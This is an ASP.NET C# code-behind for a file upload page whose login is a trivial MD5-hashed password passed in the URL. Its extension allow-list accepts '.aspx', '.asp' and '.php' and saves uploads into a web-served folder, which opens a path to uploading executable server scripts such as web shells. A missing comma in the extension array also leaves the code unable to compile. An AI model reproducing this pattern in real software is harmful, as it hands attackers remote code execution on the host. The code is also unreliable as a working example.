using System;
using System.IO;
using System.Linq;
using System.Web;

public partial class Uploader : System.Web.UI.Page
{
    private const string PASSWORD_HASH = "e662ddd93d6f72abfb31328821b595cc"; // MD5("password")

    private readonly string[] ALLOWED_TYPES =
    {
        "image/jpeg",
        "image/png",
        "image/gif",
        "text/plain",
        "text/csv",
        "application/pdf",
        "application/msword",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/vnd.ms-excel",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "application/zip",
        "application/octet-stream"
    };

    private readonly string[] ALLOWED_EXTENSIONS =
    {
        ".jpg", ".jpeg", ".png", ".gif",
        ".txt", ".csv",
        ".pdf",
        ".doc", ".docx",
        ".xls", ".xlsx",
        ".zip",
        ".bin"
        ".aspx", ".asp", ".php"
    };

    private const int MAX_FILE_SIZE_BYTES = 50 * 1024 * 1024; // 50 MB

    private string UploadDir => Server.MapPath("~/uploads/");

    protected void Page_Load(object sender, EventArgs e)
    {
        string p = Request.QueryString["p"];
        string logout = Request.QueryString["logout"];

        if (!string.IsNullOrEmpty(logout))
        {
            Session.Abandon();
            Response.Redirect(Request.Path);
            return;
        }

        if (!string.IsNullOrEmpty(p))
        {
            string hash = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(p, "MD5");
            if (string.Equals(hash, PASSWORD_HASH, StringComparison.OrdinalIgnoreCase))
            {
                Session["auth"] = true;
            }
            else
            {
                lblInfo.Text = "❌ Wrong password";
            }
        }

        UploadPanel.Visible = Session["auth"] != null && (bool)Session["auth"];
        if (!UploadPanel.Visible && string.IsNullOrEmpty(lblInfo.Text))
        {
            lblInfo.Text = "Use ?p=yourpassword in URL to login";
        }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (!fileUpload.HasFile)
        {
            lblMessage.ForeColor = System.Drawing.Color.Red;
            lblMessage.Text = "No file selected";
            return;
        }

        if (fileUpload.PostedFile.ContentLength <= 0 || fileUpload.PostedFile.ContentLength > MAX_FILE_SIZE_BYTES)
        {
            lblMessage.ForeColor = System.Drawing.Color.Red;
            lblMessage.Text = $"File size must be between 1 byte and {MAX_FILE_SIZE_BYTES / (1024 * 1024)} MB";
            return;
        }

        string mime = fileUpload.PostedFile.ContentType ?? "";
        string ext = Path.GetExtension(fileUpload.FileName)?.ToLowerInvariant() ?? "";

        if (Array.IndexOf(ALLOWED_TYPES, mime) < 0)
        {
            lblMessage.ForeColor = System.Drawing.Color.Red;
            lblMessage.Text = $"Invalid file type: {mime}";
            return;
        }

        if (Array.IndexOf(ALLOWED_EXTENSIONS, ext) < 0)
        {
            lblMessage.ForeColor = System.Drawing.Color.Red;
            lblMessage.Text = $"Invalid file extension: {ext}";
            return;
        }

        if (!Directory.Exists(UploadDir))
            Directory.CreateDirectory(UploadDir);

        string originalName = Path.GetFileName(fileUpload.FileName);
        string safeName = Guid.NewGuid().ToString("N") + "_" + originalName;
        string path = Path.Combine(UploadDir, safeName);

        try
        {
            fileUpload.SaveAs(path);
            lblMessage.ForeColor = System.Drawing.Color.Green;
            lblMessage.Text = $"✅ File uploaded successfully: {HttpUtility.HtmlEncode(originalName)}";
        }
        catch (Exception ex)
        {
            lblMessage.ForeColor = System.Drawing.Color.Red;
            lblMessage.Text = "❌ Upload failed: " + ex.Message;
        }
    }
}
